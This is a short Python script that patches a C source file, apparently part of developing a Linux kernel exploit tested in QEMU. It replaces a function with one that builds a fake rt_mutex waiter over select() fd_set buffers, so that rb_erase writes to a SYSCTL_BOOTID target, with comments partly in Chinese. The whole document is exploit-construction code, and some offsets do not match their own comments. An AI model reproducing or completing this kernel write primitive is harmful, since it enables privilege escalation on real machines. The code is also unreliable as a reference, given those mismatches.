import io
p = r'C:\Users\QingJ\Desktop\root\work\qemu\init_e2e_pd2238.c'
src = io.open(p, encoding='utf-8').read()

# build_overlay 改为带 shift 参数的版本: fake 表起始 word = j (跨 in/out/ex 连续 30 word)
old = """static void build_overlay(void){
  unsigned long parent = SCRATCH + 0x100;  /* rb "parent": +0x08/+0x10 zero, writable */
  unsigned long lock   = SCRATCH;          /* fake rt_mutex, all zero */
  for(int k=0;k<16;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  inb[0]=parent;            /* w0  tree.__rb_parent_color = write_value */
  inb[1]=0;                 /* w1  tree.rb_right                       */
  inb[2]=SYSCTL_BOOTID;     /* w2  tree.rb_left  <- rb_erase stores here */
  inb[3]=parent;            /* w3  pi_tree pc                          */
  inb[4]=0;                 /* w4  pi_tree right                       */
  outb[0]=SYSCTL_BOOTID;    /* w5  pi_tree left                        */
  outb[1]=INIT_TASK;        /* w6  task (only used by a harmless wake)  */
  outb[2]=lock;             /* w7  lock                                */
  outb[3]=3;                /* w8  prio = 3                            */
  outb[4]=0;                /* w9  deadline                            */
}"""
new = """static unsigned long flat[30];   /* 连续 30-word 视图: in(5)+out(5)+ex(5) x2 页 */
static void build_overlay_shift(int j){
  unsigned long parent = SCRATCH + 0x100;
  unsigned long lock   = SCRATCH;
  for(int k=0;k<16;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int k=0;k<30;k++){ flat[k]=0; }
  /* 5.10 flat waiter 形状, 起始全局 word = j:
     w[j+0] tree.pc=parent  w[j+2] tree.left=SYSCTL_BOOTID (rb_erase 写这)
     w[j+5] pi.pc=parent    w[j+7] pi.left=SYSCTL_BOOTID
     w[j+10]=task w[j+11]=lock w[j+12]=prio */
  flat[j+0]=parent;
  flat[j+2]=SYSCTL_BOOTID;
  flat[j+3]=parent;
  flat[j+5]=parent;
  flat[j+7]=SYSCTL_BOOTID;
  flat[j+10]=INIT_TASK;
  flat[j+11]=lock;
  flat[j+12]=3;
  /* 拆回 in/out/ex 各 5 words (nfds=320) */
  for(int k=0;k<5;k++){
    if(j+k < 30){} /* no-op */
    inb[k]=flat[k];
    outb[k]=flat[5+k];
    exb[k]=flat[10+k];
  }
}"""
assert old in src, 'build_overlay not found'
src = src.replace(old, new)

io.open(p, 'w', encoding='utf-8').write(src)
print('part2 OK: shifted overlay builder')
